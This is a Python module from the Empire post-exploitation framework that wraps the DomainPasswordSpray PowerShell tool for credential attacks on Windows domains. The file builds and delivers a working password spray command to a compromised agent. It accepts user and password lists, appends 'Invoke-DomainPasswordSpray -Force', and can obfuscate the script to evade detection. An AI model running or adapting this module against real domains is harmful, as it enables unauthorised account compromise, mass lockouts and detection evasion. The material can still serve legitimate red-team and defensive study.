from __future__ import print_function
from builtins import str
from builtins import object
from empire.server.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'DomainPasswordSpray',

            # List of one or more authors for the module
            'Author': ['@dafthack'],

            # More verbose multi-line description of the module
            'Description': ("DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack "
                            "against users of a domain."),

            'Software': '',

            'Techniques': ['T1110'],

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # List of any references/other comments
            'Comments': [
                'https://github.com/dafthack/DomainPasswordSpray'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description': 'Agent to run on.',
                'Required': True,
                'Value': ''
            },
            'UserList': {
                'Description': 'Optional UserList parameter. This will be generated automatically if not specified. ',
                'Required': False,
                'Value': '',
            },
            'Password': {
                'Description': 'A single password that will be used to perform the password spray.',
                'Required': False,
                'Value': '',
            },
            'PasswordList': {
                'Description': 'A list of passwords one per line to use for the password spray '
                               '(File must be loaded from the target machine).',
                'Required': False,
                'Value': '',
            },
            'OutFile': {
                'Description': 'A file to output the results to.',
                'Required': False,
                'Value': '',
            },
            'Domain': {
                'Description': 'A domain to spray against.',
                'Required': False,
                'Value': '',
            },
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        # First method: Read in the source script from module_source
        module_source = self.mainMenu.installPath + "/data/module_source/credentials/DomainPasswordSpray.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscationCommand)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code
        script_end = 'Invoke-DomainPasswordSpray'

        for option,values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script_end += " -" + str(option)
                    elif values['Value'].lower() == "false":
                        pass
                    else:
                        script_end += " -" + str(option) + " " + str(values['Value'])

        script_end += ' -Force;'
        if obfuscate:
            script_end = helpers.obfuscate(psScript=script_end, installPath=self.mainMenu.installPath,
                                          obfuscationCommand=obfuscationCommand)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
